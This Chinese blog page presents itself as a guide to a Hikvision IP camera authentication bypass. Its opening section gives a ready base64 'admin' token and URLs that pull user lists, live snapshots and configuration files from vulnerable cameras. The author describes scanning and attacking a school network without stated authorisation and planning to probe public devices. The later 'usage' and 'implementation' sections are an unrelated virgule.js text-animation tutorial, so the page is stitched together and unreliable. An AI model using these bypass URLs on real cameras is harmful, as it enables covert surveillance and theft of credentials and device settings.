<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <title>HikvisionIP摄像头后台绕过</title>
    <meta name="keywords" content="RavelloH,blog,python,spider,html">
    <meta name="description" content="应用HikvisionIP摄像头后台绕过漏洞快速查询目标">
    <!-- CSS -->
    <link type="text/css" rel="stylesheet" href="https://ravelloh.gitee.io/css/common.css">
    <link type="text/css" rel="stylesheet" href="https://ravelloh.gitee.io//css/style.css">
    <link type="text/css" rel="stylesheet" href="https://ravelloh.gitee.io//css/iconfont.css">
    <link rel="manifest" href="https://ravelloh.gitee.io//site.webmanifest">
    <link rel="icon" href="https://ravelloh.gitee.io//favicon.ico">
</head>


<body>
    <section class="showcase">
        <div class="shade"></div>
        <header>
            <h2 class="logo">
                <a href="/" class="logos">
                    <img class="logoimg" src="/img/avatar.jpg" style="width: 1.5em;border-radius: 50%;" alt="avatar">
                    <img class="logoname" src="/img/RavelloH.svg" alt="RavelloH's Blog">
                </a>
            </h2>
            <div class="headers">
                <nav>
                    <a href="/">
                        HOME
                    </a>
                    <a href="/works/">
                        WORKS
                    </a>
                    <a href="/articles/">
                        ARTICLES
                    </a>
                    <a href="/tag/">
                        TAG
                    </a>
                    <a href="/about/">
                        ABOUT
                    </a>
                </p>
            </nav>
        </div>
        <div class="toggle" class="header">
        </div>
    </header>

    <div class="overlay"></div>
    <div class="article" id="text">
        <h2>HikvisionIP摄像头后台绕过</h2>
        <span class="iconfontmini icon-clock"></span> 2022-12-25 • <span
            class="iconfontmini icon-classification"></span>
        <a href="/classification/#安全">安全</a> - <a href="/classification/#设计">设计</a> •
        <span class="iconfontmini icon-tag"></span>
        <a class="tag" href="/tag/#javascript">JAVASCRIPT</a> • <span class="iconfontmini icon-friend"></span> <span id="twikoo_visitors"></span>
        <div>
            <h4><b><em>Menu - 目录列表</em></b></h4>
            <a class="m" href="#起因">起因</a>
            <a class="m" href="#漏洞介绍">漏洞介绍</a>
            <a class="m" href="#使用">使用</a>
            <a class="m" href="#实现方法">实现方法</a>
            <a class="m" href="#后言">后言</a>
        </div>
        <hr>
        <br>
        <div class="center info">
            <em>
                <b>注:此漏洞已于2017年被修复。本文仅作为学习用途。</b>
                <br /><br />
            </em>
            <em>
                <span id="loadingtext"></span>
            </em>
        </div>
        <br>
        <br>

        <h4><a name="起因" href="#起因">#起因</a></h4>
        <p>
            最近在学校用Kali扫内网ms17-010的时候，发现扫了一大堆主机居然只扫出来两个，而且在攻击时发现的确没用。<br>
            诚然，永恒之蓝作为2017年的漏洞，早已在当时被紧急修复，五年过去依旧存在这个漏洞的Windows7设备已经寥寥无几了。但是在用nmap扫描时，我发现学校内有 <code>Hikvision IP camera</code>设备，大概都是2016年装上的，于是回家一查，果然存在一个后台绕过漏洞。<br>
            但是不巧的是，因为疫情封校还没法回去实践，于是在这里应用一下，看看公网上还有多少设备存在这漏洞。
        </p>
        <br>
        <br>
        <h4><a name="漏洞介绍" href="#漏洞介绍">#漏洞介绍</a></h4>
        <p>
            <div class="codeline">
                <pre>
                    <span>// 摘抄自 packetstormsecurity</span>
                    <span>Hikvision camera API includes support for proprietary HikCGI protocol, which exposes URI endpoints through the camera's web interface. The HikCGI protocol handler checks for the presence of a parameter named "auth" in the query string and if that parameter contains a base64-encoded "username:password" string, the HikCGI API call assumes the idntity of the specified user. The password is ignored.</span>
                    <span>Virtually all Hikvision products come with a superuser account named "admin", which can be easily impersonated.</span>
                </pre>
            </div>
            也就是说我们可以直接通过在链接后加入 <code>"?auth="+[base64编码的用户名:密码]</code>的形式轻松绕过。这个 <code>[base64编码的用户名:密码]</code>仅需要用户名对应，密码是什么无所谓，所以我们可以直接随便加密一个：
            <div class="codeline">
                <pre>
                    <span>admin:11</span>
                    <span>↓base64↓</span>
                    <span>YWRtaW46MTEK</span>
                </pre>
            </div>
            也就是说，我们在需要权限的页面url上直接加入?auth=YWRtaW46MTEK就能绕过验证。这些url包括:
            <div class="codeline">
                <pre>
                    <span>// 获取用户列表</span>
                    <span>http://camera.ip:port/Security/users?auth=YWRtaW46MTEK</span>
                    <span>// 获取快照</span>
                    <span>http://camera.ip:port/onvif-http/snapshot?auth=YWRtaW46MTEK</span>
                    <span>// 获得摄像头配置</span>
                    <span>http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK</span>
                </pre>
            </div>
            从结果上来看，获取用户列表的结果是这样的：
            <div class="codeline">
                <pre>
                    <span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
                    <span>&lt;UserList version=&quot;1.0&quot; xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot;&gt;</span>
                    <span>    &lt;User version=&quot;1.0&quot; xmlns=&quot;http://www.hikvision.com/ver10/XMLSchema&quot;&gt;</span>
                    <span>        &lt;id&gt;1&lt;/id&gt;</span>
                    <span>        &lt;userName&gt;admin&lt;/userName&gt;</span>
                    <span>        &lt;priority&gt;high&lt;/priority&gt;</span>
                    <span>        &lt;ipAddress&gt;0.0.0.0&lt;/ipAddress&gt;</span>
                    <span>        &lt;macAddress&gt;00:00:00:00:00:00&lt;/macAddress&gt;</span>
                    <span>        &lt;userLevel&gt;Administrator&lt;/userLevel&gt;</span>
                    <span>    &lt;/User&gt;</span>
                    <span>&lt;/UserList&gt;</span>
                </pre>
            </div>
            获取快照则会得到当前截图：
            <img src='img1.jpg'>
        </p>

        <br>
        <br>
        <h4><a name="使用" href="#使用">#使用</a></h4>
        <h5><strong>
            直接引入JS:
        </strong></h5>
        <div class="codeline">
            <pre>
                <span>&lt;script src=&quot;https://ravelloh.github.io/virgule.js/virgule.js&quot;&gt;&lt;/script&gt;</span>
            </pre>
        </div>
        <br>
        <h5><strong>
            或手动添加下方JS:
        </strong></h5>
        <div class="codeline">
            <pre>
                <span>// Author:RavelloH</span>
                <span>// LICENCE: MIT</span>
                <span>// Repo src: github.com/RavelloH/virgule.js</span>
                <span>randArrMin = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"];</span>
                <span>randArr = ["あ","ぃ","い","ぅ","う","ぇ","え","ぉ","お","か","が","き","ぎ","く","ぐ","け","げ","こ","ご","さ","ざ","し","じ","す","ず","せ","ぜ","そ","ぞ","た","だ","ち","ぢ","っ","つ","づ","て","で","と","ど","な","に","ぬ","ね","の","は","ば","ぱ","ひ","び","ぴ","ふ","ぶ","ぷ","へ","べ","ぺ","ほ","ぼ","ぽ","ま","み","む","め","も","ゃ","や","ゅ","ゆ","ょ","よ","ら","り","る","れ","ろ","ゎ","わ","ゐ","ゑ","を","ん","ゔ","ゕ","ゖ","ァ","ア","ィ","イ","ゥ","ウ","ェ","エ","ォ","オ","カ","ガ","キ","ギ","ク","グ","ケ","ゲ","コ","ゴ","サ","ザ","シ","ジ","ス","ズ","セ","ゼ","ソ","ゾ","タ","ダ","チ","ヂ","ッ","ツ","ヅ","テ","デ","ト","ド","ナ","ニ","ヌ","ネ","ノ","ハ","バ","パ","ヒ","ビ","ピ","フ","ブ","プ","ヘ","ベ","ペ","ホ","ボ","ポ","マ","ミ","ム","メ","モ","ャ","ヤ","ュ","ユ","ョ","ヨ","ラ","リ","ル","レ","ロ","ヮ","ワ","ヰ","ヱ","ヲ","ン","ヴ","ヵ","ヶ","ヷ","ヸ","ヹ","ヺ","ー","ヾ","ㄅ","ㄆ","ㄇ","ㄈ","ㄉ","ㄊ","ㄋ","ㄌ","ㄍ","ㄎ","ㄏ","ㄐ","ㄑ","ㄒ","ㄓ","ㄔ","ㄕ","ㄖ","ㄗ","ㄘ","ㄙ","ㄝ","ㄞ","ㄟ","ㄠ","ㄡ","ㄢ","ㄣ","ㄤ","ㄥ","ㄦ","ㄧ","ㄨ","ㄩ","〇","口","甲","乙","丙","丁","戊","己","庚","辛","壬","癸",];</span>
                <span></span>
                <span>function virgule(target, context, speed = 100) {</span>
                <span>    //context重组</span>
                <span>    contextArr = [];</span>
                <span>    for (var i = 0; i < context.length; i++) {</span>
                    <span>        contextArr.push(context[i])</span>
                    <span>    }</span>
                    <span>    // 添加/</span>
                    <span>    target.innerHTML = "";</span>
                    <span>    numVirgule = 0</span>
                    <span>    var virgulegenerate = setInterval(</span>
                    <span>        function() {</span>
                    <span>            // 字符划分</span>
                    <span>            if (escape(contextArr[numVirgule]).indexOf("%u") < 0) {</span>
                        <span>                if (contextArr[numVirgule] == ' ') {</span>
                        <span>                    target.innerHTML += ' '</span>
                        <span>                } else {</span>
                        <span>                    target.innerHTML += '/'</span>
                        <span>                }</span>
                        <span>            } else {</span>
                        <span>                target.innerHTML += '//'</span>
                        <span>            }</span>
                        <span>            numVirgule += 1</span>
                        <span>            if (numVirgule > context.length) {</span>
                        <span>                clearInterval(virgulegenerate);</span>
                        <span>                target.innerHTML = target.innerHTML.slice(0, target.innerHTML.length-1)</span>
                        <span>                setTimeout(function() {</span>
                        <span>                    textIn()}, 100)</span>
                        <span>            }</span>
                        <span>        },</span>
                        <span>        1000/speed)</span>
                        <span></span>
                        <span>    // 文字进入</span>
                        <span>    numIn = 0;</span>
                        <span>    numCharacter = 0;</span>
                        <span>    function textIn() {</span>
                        <span>        originText = target.innerHTML;</span>
                        <span>        var virgulereplace = setInterval(</span>
                        <span>            function() {</span>
                        <span>                numIn += 1</span>
                        <span>                if (numIn >= contextArr.length) {</span>
                        <span>                    clearInterval(virgulereplace)</span>
                        <span>                    textwrite()</span>
                        <span>                }</span>
                        <span>                cacheText = ''</span>
                        <span>                numCharacter = 0</span>
                        <span>                for (i = 0; i < numIn; i++) {</span>
                            <span>                    if (escape(contextArr[i]).indexOf("%u") < 0) {</span>
                                <span>                        if (contextArr[i] == ' ') {</span>
                                <span>                            cacheText += ' '</span>
                                <span>                            numCharacter += 1</span>
                                <span>                        } else {</span>
                                <span>                            //单字符</span>
                                <span>                            var rand = Math.floor(Math.random() * randArrMin.length);</span>
                                <span>                            cacheText += randArrMin[rand]</span>
                                <span>                            numCharacter += 1</span>
                                <span>                        }</span>
                                <span>                    } else {</span>
                                <span>                        // 双字符</span>
                                <span>                        var rand = Math.floor(Math.random() * randArr.length);</span>
                                <span>                        cacheText += randArr[rand]</span>
                                <span>                        numCharacter += 2</span>
                                <span>                    }</span>
                                <span>                }</span>
                                <span>                target.innerHTML = cacheText + originText.slice(numCharacter, originText.length)</span>
                                <span>            },</span>
                                <span>            2000/speed)</span>
                                <span></span>
                                <span>        // 原始文字写入</span>
                                <span>        numWrite = 0</span>
                                <span>        function textwrite() {</span>
                                <span>            originText = target.innerHTML;</span>
                                <span>            var virgulewrite = setInterval(</span>
                                <span>                function() {</span>
                                <span>                    numWrite += 1</span>
                                <span>                    if (numWrite >= contextArr.length) {</span>
                                <span>                        clearInterval(virgulewrite)</span>
                                <span>                    }</span>
                                <span>                    cacheText = ''</span>
                                <span>                    numCharacter = 0</span>
                                <span>                    for (i = 0; i < numIn; i++) {</span>
                                    <span>                        if (escape(contextArr[i]).indexOf("%u") < 0) {</span>
                                        <span>                            if (contextArr[i] == ' ') {</span>
                                        <span>                                cacheText += ' '</span>
                                        <span>                                numCharacter += 1</span>
                                        <span>                            } else {</span>
                                        <span>                                //单字符</span>
                                        <span>                                var rand = Math.floor(Math.random() * randArrMin.length);</span>
                                        <span>                                cacheText += randArrMin[rand]</span>
                                        <span>                                numCharacter += 1</span>
                                        <span>                            }</span>
                                        <span>                        } else {</span>
                                        <span>                            // 双字符</span>
                                        <span>                            var rand = Math.floor(Math.random() * randArr.length);</span>
                                        <span>                            cacheText += randArr[rand]</span>
                                        <span>                            numCharacter += 2</span>
                                        <span>                        }</span>
                                        <span>                    }</span>
                                        <span>                    target.innerHTML = context.slice(0, numWrite) + cacheText.slice(numWrite, cacheText.length) + originText.slice(numCharacter, originText.length)</span>
                                        <span>                },</span>
                                        <span>                2000/speed)</span>
                                        <span></span>
                                        <span>        }</span>
                                        <span>    }</span>
                                        <span>}</span>
                                    </pre>
                                </div>

                                <br>
                                <br>
                                <p>
                                    用以上任意一种方法，获取到JS即可。接下来就是如何使用，也十分方便：<br>
                                    <div class="codeline">
                                        <pre>
                                            <span>virgule(target,context,speed) //target context必填，speed可选填，默认100</span>
                                            <span>//example:</span>
                                            <span>virgule(document.getElementById('jumping'), 'Place the text you want as the result here',100)</span>
                                            <span>//对文档中一个id为jumping的元素使用virgule效果，目标文字是"Place the text you want as the result here"，速度为100</span>

                                        </pre>
                                    </div>
                                    需要注意的是，此项目需搭配等宽字体使用，如自带的Courier New、Terminal等，或者自己引入其他等宽字体。<br>
                                    这里推荐Microsoft Yahei Mono和SF Mono SC。
                                </p>

                                <h4><a name="实现方法" href="#实现方法">#实现方法</a></h4>
                                <p>
                                    注:下方行数表示以上Js代码所处行数。<br>
                                    4-5：定义了两个列表<code>randArrMin</code>以及<code>randArr</code>，前者用于一个英文字符宽的字符的替换，后者用于一个中文字符宽的替换。 <br>
                                    7：定义了virgule的主函数，默认参数中<code>target</code><code>context</code>必填，<code>speed</code>选填，默认100。<br>
                                    8-12：将context中的内容转换到contextArr中储存。<br>
                                    14-15：重置目标<br>
                                    16-36：创建延迟循环virgulegenerate，间隔1000/speed毫秒。
                                    <li>18-28：判断中英文，中文插入两个/，英文插入一个/，空格插入空格。</li>
                                    <li>29-34：判断何时结束斜杠的插入动作，延迟100ms唤起textIn()</li>
                                    39-40：重置变量<br>
                                    41-109：textIn()主函数，用于将生成的斜杠替换为context文字。
                                    <li>43：创建定时器virgulereplace，间隔2000/speed毫秒</li>
                                    <li>46-49：终止器，用于在此环节结束后呼出下一个操作函数textWrite()</li>
                                    <li>52-69：二次递归循环，用于按上一级循环进行量将对应数量斜杠替换为随机文字，同样分双字符、单字符、空格三种情况。</li>
                                    <li>70：对应写入，切分随机字符组与斜杠字符组，保证总长度不变。</li>
                                    16-108：textIn()函数下的二级函数textWrite()，用于在将target中所有字符替换为随机字符后，继续将随机字符替换为context()
                                    <li>79-83：在所有过程结束后终止定时器</li>
                                    <li>86-103：同52-69，将contextArr中内容逐个添加进去。</li>
                                    <li>104：重组字符串，酱三个列表中的内容整合写入target中。</li>
                                </p>
                                <br>
                                <h5><strong>
                                    关键分析
                                </strong></h5>
                                <p>
                                    其实整个过程中最复杂的是三个插入过程的顺序。这简单来说，分为以下三个阶段：<br>
                                    1.用斜杠覆盖文本。<br>
                                    2.逐渐将斜杠替换为随机文字。这一过程中，每将一个斜杠组替换一个新字符，就会重新将它前面的随机字符再随机化。<br>
                                    3.用target中的文字替换随机文字。这一过程大体与2相反，没将一个随机字符替换为目标字符，就会刷新其后的随机字符。
                                    <br /><br />
                                    以上三个过程顺次进行，每个过程完成后唤起下一个过程。如果还不理解，可以在<a class="linkline" href="#效果">#效果</a>章节的在线体验中，选择较低的速度运行，以理解这三个过程。
                                </p>

                                <h4><a name="后言" href="#后言">#后言</a></h4>
                                <p>
                                    上述就是virgule.js现有的功能介绍和使用方法，顺带着也写了大体的实现方法。 <br />
                                    本来打算把virgule效果应用给整个博客的，但碍于实在找不到什么地方再去添加，先鸽了。
                                </p>


                                <hr>
                                <br>
                                <span class="iconfontmini icon-aboutcircle"></span> 原创内容使用 知识共享 署名-非商业性使用-相同方式共享 4.0 (CC BY-NC-ND
                                4.0)
                                协议授权。

                                <br><br>
                                <div id="tcomment"></div>
                                <script src="https://cdn.staticfile.org/twikoo/1.6.4/twikoo.all.min.js"></script>
                                <script>
                                    twikoo.init({
                                        envId: 'https://comment.z-blog.tk/',
                                        el: '#tcomment',
                                    })
                                </script>

                            </div>
                            <ul class="social">
                                <li><a href="/about/"><span class="iconfont icon-about"></span></a></li>
                                <li><a href="http://github.com/ravelloh" target="_blank" rel="noreferrer"><span
                                    class="iconfont icon-github"></span></a></li>
                                <li>
                                    <a href="http://xeocnet-studio.github.io" target="_blank" rel="noreferrer">
                                        <span class="iconfont icon-home">
                                        </span>
                                    </a>
                                </li>
                                <li><a href="/RSS/rss.xml" target="_blank"><span class="iconfont2 icon-rss"></span></a></li>
                            </ul>
                        </section>
                        <div class="menu">
                            <ul>
                                <script type="text/javascript" src="/js/menu.js"></script>
                            </ul>
                        </div>
                        <script>
                            var img = [];
                            var flag = 0;
                            var mulitImg = ['img1.jpg', 'new.gif'];
                            var imgTotal = mulitImg.length; //图片总数
                            for (var i = 0; i < imgTotal; i++) {
                                document.getElementById("loadingtext").innerHTML = "*文章插图加载中:" + flag + "/" + imgTotal;
                                img[i] = new Image()
                                img[i].src = mulitImg[i]
                                img[i].onload = function () {
                                    flag++;
                                    if (flag == imgTotal) {
                                        document.getElementById("loadingtext").innerHTML = "*文章插图加载完成:" + flag + "/" + imgTotal;
                                    } else {
                                        document.getElementById("loadingtext").innerHTML = "*文章插图加载中:" + flag + "/" + imgTotal;
                                        return;
                                    }
                                }
                            }
                        </script>

                        <!-- JavaScript -->
                        <script src="https://ravelloh.gitee.io//js/script.js"></script>
                        <script type="text/javascript" src="https://ravelloh.gitee.io//js/common.js"></script>
                        <script src="//instant.page/5.1.1" type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>


                    </body>

                </html>